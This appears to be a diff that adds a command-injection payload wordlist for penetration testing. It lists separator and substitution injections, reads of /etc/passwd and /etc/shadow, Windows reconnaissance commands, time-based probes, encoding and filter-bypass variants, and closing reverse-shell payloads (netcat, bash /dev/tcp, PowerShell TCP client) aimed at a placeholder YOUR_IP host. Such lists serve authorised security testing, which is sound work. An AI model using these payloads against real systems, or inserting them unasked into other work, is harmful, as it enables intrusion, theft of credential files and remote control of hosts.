@@ -1,0 +1,80 @@
+# Command Injection Payloads
+
+# Basic command injection
+; ls
+| ls
+|| ls
+& ls
+&& ls
+`ls`
+$(ls)
+
+# Chained commands
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+
+# Command substitution
+`whoami`
+$(whoami)
+;`whoami`
+;$(whoami)
+
+# File operations
+; cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+| cat /etc/shadow
+; ls -la
+| ls -la /
+
+# Windows commands
+& dir
+| dir
+& type C:\Windows\win.ini
+| type C:\boot.ini
+& whoami
+| net user
+
+# Time-based detection
+; sleep 5
+| sleep 5
+& ping -n 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; timeout 5
+& timeout /t 5
+
+# Output redirection
+; ls > /tmp/output.txt
+| ls > /tmp/output.txt
+& dir > C:\temp\output.txt
+
+# URL encoded
+%3B%20ls
+%7C%20ls
+%26%20whoami
+
+# Newline injection
+%0a whoami
+%0d%0a whoami
+\n whoami
+\r\n whoami
+
+# Spaces bypass
+;cat</etc/passwd
+|cat</etc/passwd
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+
+# Quotes bypass
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+
+# Reverse shell payloads (for authorized testing only - replace YOUR_IP and PORT)
+; nc -e /bin/sh YOUR_IP PORT
+| bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
+& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',PORT);"
